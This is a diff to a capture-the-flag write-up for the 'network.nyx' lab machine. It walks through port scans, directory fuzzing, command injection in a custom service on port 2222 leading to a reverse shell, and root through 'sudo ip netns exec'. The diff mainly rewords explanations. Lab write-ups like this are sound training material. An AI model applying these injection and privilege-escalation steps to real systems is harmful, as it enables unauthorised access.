@@ -14,9 +14,9 @@ A custom service on port 2222 asks for an IPv4 address and returns network infor
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn network.nyx
@@ -29,7 +29,7 @@ PORT     STATE  SERVICE       REASON
 MAC Address: 08:00:27:6C:87:F7 (Oracle VirtualBox virtual NIC)
 ```
 
-Four ports are found open: **22 (SSH)**, **80 (HTTP)**, **2222**, and **8080**. A version/script scan against all four fills in the details:
+Four ports come back open: **22 (SSH)**, **80 (HTTP)**, **2222**, and **8080**. A version/script scan against all four fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80,2222,8080 -sVC network.nyx
@@ -67,19 +67,25 @@ PORT     STATE  SERVICE       VERSION
 |_http-title: Apache2 Debian Default Page: It works
 ```
 
+The scan already hints at where the action is: the two HTTP servers announce themselves as stock Apache default pages, while the service on 2222 prompts for an IPv4 address — a custom program, and the most interesting thing on the box.
+
 ### Web Enumeration
 
-Two separate web servers are running:
+Both web servers serve identical stock Apache default pages:
 
 ```
 http://network.nyx
 ```
+
 <img src="../Images/network/Pasted image 20260717154605.png"/>
 
 ```
 http://network.nyx:8080
 ```
+
 <img src="../Images/network/Pasted image 20260717154628.png"/>
+
+A content scan against each confirms there's nothing hidden behind either — only the default index and the usual forbidden entries:
 
 ```bash
 $ ffuf -u http://network.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt,.zip -ic
@@ -91,7 +97,8 @@ index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Dura
 server-status           [Status: 403, Size: 316, Words: 21, Lines: 10, Duration: 14ms]
 :: Progress: [1102735/1102735] :: Job [1/1] :: 6666 req/sec :: Duration: [0:08:34] :: Errors: 0 ::
 ```
-```Bash
+
+```bash
 $ ffuf -u http://network.nyx:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt,.zip -ic
 
 index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 41ms]
@@ -103,6 +110,8 @@ server-status           [Status: 403, Size: 316, Words: 21, Lines: 10, Duration:
 ```
 
 ### The Service on 2222
+
+With the web servers ruled out, the custom service is the obvious next target. Connecting and feeding it an address shows what it does — it runs the equivalent of an `ipcalc` on the input:
 
 ```bash
 $ nc network.nyx 2222
@@ -148,7 +157,7 @@ uid=1000(net) gid=1000(net) groups=1000(net)
 [+] Network information retrieved successfully.
 ```
 
-The same syntax is reused to get a reverse shell instead of a one-off command:
+The `id` output landing in the middle of the response confirms the input is concatenated straight into a shell command. The same syntax then delivers a reverse shell instead of a one-off command:
 
 ```bash
 $ nc network.nyx 2222
@@ -181,7 +190,7 @@ uid=1000(net) gid=1000(net) groups=1000(net)
 The shell is upgraded to something usable:
 
 ```bash
-python3 -c 'import pty; pty.spawn ("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 [Ctrl + z]
 stty raw -echo; fg
 export TERM=xterm
@@ -203,6 +212,8 @@ ed57ab104e04339fcc95e35865eb1e79
 
 ### `sudo ip netns`
 
+A check of what the current user may run as root is the first move:
+
 ```bash
 net@network:~$ sudo -l
 Matching Defaults entries for net on network:
@@ -215,7 +226,7 @@ User net may run the following commands on network:
 
 > **Resource:** `https://gtfobins.org/gtfobins/ip/`
 
-`ip` has a documented GTFOBins technique built around network namespaces: creating one and executing a shell inside it (`ip netns exec`) requires elevated capabilities that the process already has when run via `sudo` — and the resulting shell keeps those privileges instead of being confined to the namespace's own isolation:
+`ip` can be run as root with no password, and it has a documented GTFOBins technique built around network namespaces: creating one and executing a shell inside it (`ip netns exec`) requires elevated capabilities that the process already has when run via `sudo` — and the resulting shell keeps those privileges rather than being confined by the namespace's isolation:
 
 ```bash
 net@network:~$ sudo ip netns add foo
@@ -223,6 +234,8 @@ net@network:~$ sudo ip netns exec foo /bin/sh -p
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
+With a root shell, the last flag is readable:
 
 ```bash
 # id
